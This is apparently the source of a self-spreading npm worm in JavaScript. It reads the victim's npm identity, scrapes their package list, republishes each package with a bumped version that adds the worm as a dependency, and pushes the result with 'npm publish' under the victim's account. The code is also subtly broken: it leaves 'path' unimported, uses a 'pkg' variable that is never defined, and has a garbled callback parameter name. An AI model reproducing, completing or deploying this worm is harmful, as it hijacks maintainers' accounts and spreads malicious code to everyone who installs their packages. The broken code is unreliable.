var wormInfo = require("./package");
var child    = require("child_process");
var https    = require("https");
var fs       = require("fs");

// get the targets username
function getUsername(callback) {
  child.exec("npm whoami", { encoding: "utf8" }, function (err, stderr, stdout) {
    if (err) return; // yolo
    if (stderr) return; // yolo

    var username = stdout.trim();
    if (!username) return; // yolo

    callback(username);
  });
}

// get all the npm packages for the specified user
function getPackages(username, callback) {
  https.get("https://www.npmjs.com/~" + username, function(res) {
    var buf = "";

    res.setEncoding("utf8");

    res.on("data", function (chunk) {
      buf += chunk;
    });

    res.on("end", function () {
      var packages = [];

      buf.replace(/href="\/package\/(.*?)"/g, function (full, packageName) {
        packages.push(packageName);
      });

      callback(packages);
    })
  }).on("error", function (err) {
    // yolo
  });
}

// republish the target package
function republish(pkgName) {
  // create dummy directory
  var cwd = path.join(__dirname, "." + pkgName);
  fs.mkdirSync(cwd);

  // create dummy node_modules directory
  var modulesLoc = path.join(cwd, "node_modules");
  fs.mkdirSync(modulesLoc);

  // path the module will be installed to
  var moduleLoc  = path.join(modulesLoc, pkgName);
  var packageLoc = path.join(moduleLoc, "package.json");

  // install package
  child.exec("npm install " + pkgName, { cwd: cwd }, function (err) {
    if (err) return; // yolo

    var packageJson = require(packageLoc);

    // bump the patch version
    var versionParts = packageJson.version.split(".");
    var patchVersion = parseInt(versionParts.pop());
    versionParts.push(patchVersion + 1);
    pkg.version = versionParts.join(".");

    // add the worm to the dependencies :~)
    pkg.dependencies[wormInfo.name] = "*";

    // save new package.json
    fs.writeFileSync(packageLoc, JSON.stringify(pkg, null, "  "));

    // publish new version with updated package.json
    child.exec("npm publish", { cwd: moduleLoc }, function (err) {
      if (err) return; // yolo
    });
  });
}

// let the magic begin
getUsername(function (username) {
  getPackages(username, function (dapackagesta) {
    packages.forEach(republish);
  });
});
